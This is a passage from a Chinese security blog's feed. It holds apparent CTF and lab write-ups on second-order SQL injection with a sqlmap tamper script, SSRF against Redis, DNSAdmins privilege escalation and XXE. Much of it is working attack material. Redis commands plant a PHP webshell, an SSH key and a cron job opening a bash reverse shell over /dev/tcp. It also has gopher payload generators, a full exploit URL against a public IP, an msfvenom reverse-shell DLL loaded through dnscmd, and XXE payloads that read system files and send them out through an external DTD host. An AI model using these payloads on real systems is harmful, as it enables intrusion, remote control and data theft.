target="_blank" rel="noopener">http://10.10.10.66/notes.php</a><br>在index之后请求notes.php验证结果</p><p>response = s.post(“<a href="http://10.10.10.66/register.php&quot;" target="_blank" rel="noopener">http://10.10.10.66/register.php&quot;</a>, data=post_data)</p><p>php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)</p><p>最终tamper：</p><pre><code>#!/usr/bin/env pythonimport reimport requestsfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies():passdef create_account(payload):s = requests.Session()post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)return &quot;PHPSESSID={0}&quot;.format(php_cookie)def tamper(payload, **kwargs):headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;Cookie&quot;] = create_account(payload)return payload</code></pre><p>sqlmap语句：</p><pre><code>sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080</code></pre><p><img src="4.png" alt=""></p><p><img src="5.png" alt=""></p><p>注意点：</p><ul><li>post包中密码需要和tamper脚本中一致</li><li>去掉login.req中的cookie那一行</li><li>使用代理的话需要开启Burpsuit</li></ul><p>这里就直接贴最终的paylaod吧：</p><pre><code>sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast</code></pre><p>####需要–no-cast 参数</p><h1 id="0x06、总结："><a href="#0x06、总结：" class="headerlink" title="0x06、总结："></a>0x06、总结：</h1><p>主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的</p><p>参考链接：</p><p><a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/</a></p><p><a href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p><p><a href="https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5" target="_blank" rel="noopener">https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01、二次注入原理：&quot;&gt;&lt;a href=&quot;#0x01、二次注入原理：&quot; class=&quot;headerlink&quot; title=&quot;0x01、二次注入原理：&quot;&gt;&lt;/a&gt;0x01、二次注入原理：&lt;/h1&gt;&lt;p&gt;用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSRF+Redis</title>
    <link href="https://github.com/2020/05/19/SSRF-Redis/"/>
    <id>https://github.com/2020/05/19/SSRF-Redis/</id>
    <published>2020-05-19T09:02:15.000Z</published>
    <updated>2020-05-19T09:12:21.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="noopener">猪猪侠SSRF议题</a></p><p>形成SSRF的代码示例：</p><pre><code>&lt;?phpfunction curl($url){  $ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);}$url = $_GET[&apos;url&apos;];curl($url);?&gt;</code></pre><h2 id="SSRF绕过限制："><a href="#SSRF绕过限制：" class="headerlink" title="SSRF绕过限制："></a>SSRF绕过限制：</h2><ol><li><p>利用短网址</p></li><li><p>xip.io  –&gt; 127.0.0.1.xip.io</p></li><li><p>@符号绕过 –&gt; <a href="http://www.baidu.com@127.0.0.1" target="_blank" rel="noopener">www.baidu.com@127.0.0.1</a> —&gt;访问127.0.0.1（利用解析问题绕过）</p></li><li><p>dns rebinding ： <a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p></li><li><p>更改ip地址写法，如十六进制 <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> —&gt;<a href="http://0177.0.0.1" target="_blank" rel="noopener">http://0177.0.0.1</a></p></li><li><p>协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）</p> <?php header("Location:file:///etc/passwd") ?></li></ol><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><h2 id="绝对路径写webshell："><a href="#绝对路径写webshell：" class="headerlink" title="绝对路径写webshell："></a><strong>绝对路径写webshell：</strong></h2><ul><li>flushall</li><li>set 1 ‘<?php system($_GET["cmd"]);?>‘ </li><li>config set dir /var/www/html</li><li>config set dbfilename shell.php</li><li>save</li></ul><p>写ssh公钥：</p><pre><code>ssh-keygen -t rsa ###生成公钥</code></pre><ul><li>flushall</li><li>set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=</li><li>config set dir /root/.ssh/</li><li>config set dbfilename authorized_keys</li><li>save</li></ul><p><strong>写contrab定时任务反弹shell：</strong></p><ul><li>flushall</li><li>set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’</li><li>config set dir /var/spool/cron/</li><li>config set dbfilename root</li><li>save</li></ul><h2 id="SSRF-Redis利用"><a href="#SSRF-Redis利用" class="headerlink" title="SSRF+Redis利用"></a>SSRF+Redis利用</h2><ul><li>http、https 内网服务探测</li><li>file-读取文本</li><li>file:///etc/passwd</li><li>….</li><li>dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）</li></ul><p>dict://127.0.0.1:6379/info<br>dict://127.0.0.1:6379/getuser<br>dict://127.0.0.1:6379/flushall</p><p><strong>gopher 万能协议反弹shell：(redis利用需要REST编码)</strong></p><p>Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码<br>转换Redis RESP格式脚本<a href="https://xz.aliyun.com/t/5665#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-4</a><br>根据需求更改payload、filename、path的值</p><pre><code>import urllibprotocol=&quot;gopher://&quot;ip=&quot;127.0.0.1&quot;port=&quot;6379&quot;payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd:cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):CRLF=&quot;\r\n&quot;redis_arr = arr.split(&quot; &quot;)cmd=&quot;&quot;cmd+=&quot;*&quot;+str(len(redis_arr))for x in redis_arr:cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)cmd+=CRLFreturn cmdif __name__==&quot;__main__&quot;:for x in cmd:payload += urllib.quote(redis_format(x))print payload</code></pre><p><strong>ubuntu无法写crontab反弹shell： <a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></strong></p><p><img src="1.png" alt=""></p><h2 id="SSRF利用redis之不换行"><a href="#SSRF利用redis之不换行" class="headerlink" title="SSRF利用redis之不换行"></a><a href="https://dzmitry-savitski.github.io/2018/07/redis-ssrf-exploits-without-new-line" target="_blank" rel="noopener">SSRF利用redis之不换行</a></h2><ul><li>FLUSHALL</li><li>config set dir /var/www/html/</li><li>set a1 ZY%16%0E%16F</li><li>set a2 ffffff</li><li>BITOP XOR payload a1 a2</li><li>append payload eval($_GET[c]);%3f&gt;</li><li>config set dbfilename cmd.php</li><li>save</li></ul><p>Gopher有如下几点问题</p><ol><li>PHP的curl默认不跟随302跳转</li><li>curl7.43gopher协议存在%00截断的BUG，v7.45以上可用</li><li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li><li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li></ol><h2 id="SSRF-打内网之POST请求-CTF题目"><a href="#SSRF-打内网之POST请求-CTF题目" class="headerlink" title="SSRF 打内网之POST请求(CTF题目)"></a>SSRF 打内网之POST请求(CTF题目)</h2><p><a href="http://152.136.63.75:8016/index.php?url=" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=</a>    —&gt;存在SSRF</p><p>目录扫描发现 <a href="http://152.136.63.75:8016/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/webshe11231231231.php</a> 页面</p><p>view-source:<a href="http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php</a>   —&gt;file读取webshell源码</p><pre><code>&lt;?php$serverList = array(&quot;127.0.0.1&quot;);$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];foreach ($serverList as $host) {if ($ip === $host) {if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {@eval($_POST[&apos;hacker&apos;]);} else {die(&quot;You aren&apos;t admin!&quot;);}} else {die(&apos;This is webshell&apos;);}}</code></pre><p>GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：</p><pre><code>exp = &apos;&apos;&apos;\POST /webshe11231231231.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: deflateDNT: 1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);&apos;&apos;&apos;import urllibtmp = urllib.quote(exp)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = &quot;_&quot;+urllib.quote(new)print result</code></pre><p>更改命令的时候Content-Length的值也需要修改<br>根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”</p><p><img src="2.png" alt=""></p><p>如上图所示，所以需要两次编码</p><p>生成paylaod：</p><pre><code>kali@kali:~$ python exp.py_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p>最后exp：</p><pre><code>152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p><img src="3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;猪猪侠S
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透之隐藏管理员用户和派生本地管理员</title>
    <link href="https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <id>https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/</id>
    <published>2020-05-01T04:34:28.000Z</published>
    <updated>2020-05-01T04:51:06.725Z</updated>
    
    <content type="html"><![CDATA[<p>典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）</p><p>常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。</p><p>这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现</p><p><strong>域隐藏管理账户：</strong></p><p>A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。</p><p>由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A</p><p><strong>Derivative Local Admins（派生本地管理员）：</strong><br>在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：</p><p><a href="http://www.sixdub.net/?p=591" target="_blank" rel="noopener">经典案例</a>：（在这个例子中，Sally是WorkStation A中的派生本地管理员）</p><p><img src="1.png" alt=""></p><p><strong>环境描述：</strong></p><ul><li><p>域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  </p></li><li><p>域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员</p></li><li><p>Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录</p></li><li><p>Sally在 “Workstation C”上登录</p></li></ul><p>通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。</p><p>直接截取原文中的实际利用步骤：</p><p><img src="2.png" alt=""></p><p>则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）</p><p>那么我们简化一下上边的图，画出自己的理解图：</p><p><img src="3.png" alt=""></p><p>隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找</p><p><strong>使用Bloodhound查找隐藏管理账户</strong>的几种方法：</p><ul><li>Map Domain Trust</li><li>左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员</li><li>搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）&lt;/p&gt;
&lt;p&gt;常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。&lt;/p&gt;
&lt;p&gt;这个过程往往
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之DNSadmins</title>
    <link href="https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"/>
    <id>https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/</id>
    <published>2020-04-30T12:54:39.000Z</published>
    <updated>2020-04-30T12:58:13.891Z</updated>
    
    <content type="html"><![CDATA[<p>默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限</p><p><strong>利用条件：</strong></p><p>拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权</p><p><strong>whoami /groups  查看用户组</strong></p><p><img src="1.png" alt=""></p><p><strong>制作dll：</strong></p><pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</code></pre><p><strong>开启smb共享：</strong>（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）</p><pre><code>sudo impacket-smbserver tw .</code></pre><p><strong>注入dll</strong></p><pre><code>dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll</code></pre><p><strong>监听：</strong></p><pre><code>nc -lvvp 444</code></pre><p><strong>重启dns</strong>致使paylload生效：</p><pre><code>sc.exe stop dnssc.exe start dns</code></pre><p>或</p><pre><code>sc.exe \\10.10.10.169 stop dnssc.exe \\10.10.10.169 start dns</code></pre><p><img src="2.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XXE漏洞详解</title>
    <link href="https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-04-26T15:16:55.000Z</published>
    <updated>2020-04-26T15:38:20.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01、XXE原理："><a href="#0x01、XXE原理：" class="headerlink" title="0x01、XXE原理："></a>0x01、XXE原理：</h1><p>XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）</p><h2 id="1、XML：Extensible-Markup-Language，可扩展标记基础"><a href="#1、XML：Extensible-Markup-Language，可扩展标记基础" class="headerlink" title="1、XML：Extensible Markup Language，可扩展标记基础"></a><strong>1、XML：Extensible Markup Language，可扩展标记基础</strong></h2><p>XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：</p><ul><li><p>XML元素</p></li><li><p>属性</p></li><li><p>实体     </p></li></ul><p><strong>以一个简单的XXE POC为例：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明&lt;!DOCTYPE test [                                ####文档类型定义（DTD）&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名</code></pre><h2 id="2-DTD（文档类型定义）实体"><a href="#2-DTD（文档类型定义）实体" class="headerlink" title="2.DTD（文档类型定义）实体"></a>2.DTD（文档类型定义）实体</h2><ul><li><p>定义XML文件中有哪些模块，这些模块能包含什么样的内容</p></li><li><p>DTD可以在XML文档内声明，也可以外部引用</p></li></ul><p><strong>内部声明DTD：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot; &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型  &lt;!ELEMENT from    (#PCDATA)&gt;       &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p><strong>引用外部DTD：</strong></p><p>DTD文件内容：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型&lt;!ELEMENT from    (#PCDATA)&gt;     &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;</code></pre><p>引用DTD：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;&lt;note&gt;  &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><blockquote><p>ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询</p></blockquote><h2 id="3、为什么能形成注入？"><a href="#3、为什么能形成注入？" class="headerlink" title="3、为什么能形成注入？"></a>3、为什么能形成注入？</h2><pre><code>XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换</code></pre><p>简单的漏洞代码：</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$user = $creds-&gt;user;$pass = $creds-&gt;pass;#回显信息  echo &quot;You have logged in as user $user&quot;;###漏洞触发点在user元素中?&gt;</code></pre><h1 id="0x02、XXE漏洞验证："><a href="#0x02、XXE漏洞验证：" class="headerlink" title="0x02、XXE漏洞验证："></a>0x02、XXE漏洞验证：</h1><p>如上漏洞代码poc，paylaod.txt：</p><pre><code>&lt;creds&gt;&lt;user&gt; Ed &lt;/user&gt;&lt;pass&gt; mypass &lt;/pass&gt;&lt;/creds&gt;</code></pre><blockquote><p>tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）</p></blockquote><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;</code></pre><p>curl验证：</p><pre><code>curl -d @payload.txt http://localhost/xml_injectable.php</code></pre><p>显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息</p><p><img src="1.png" alt=""></p><h1 id="0x03、XXE能做什么："><a href="#0x03、XXE能做什么：" class="headerlink" title="0x03、XXE能做什么："></a>0x03、XXE能做什么：</h1><p><strong>[1]文件读取</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="2.png" alt=""></p><p><strong>[2]SSRF探测端口内网服务</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="3.png" alt=""></p><p>尝试在XXE漏洞代码中加入：<br>    error_reporting(0);</p><p><img src="4.png" alt=""></p><p>上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）</p><p><strong>[3]Bind XXE （OOB）外带数据（无回显攻击）</strong></p><p>[代码中注释掉 echo “You have logged in as user $user”;]</p><p><strong>OOB  文件读取</strong></p><p>evil.dtd：</p><pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;</code></pre><p>payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="5.png" alt=""></p><p><strong>OOB  探测内网端口及服务：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h1 id="0x04、攻击内网"><a href="#0x04、攻击内网" class="headerlink" title="0x04、攻击内网"></a>0x04、攻击内网</h1><p><strong>SSRF+内网服务命令执行实现内网攻击</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>系统命令执行</strong></p><p>(PHP 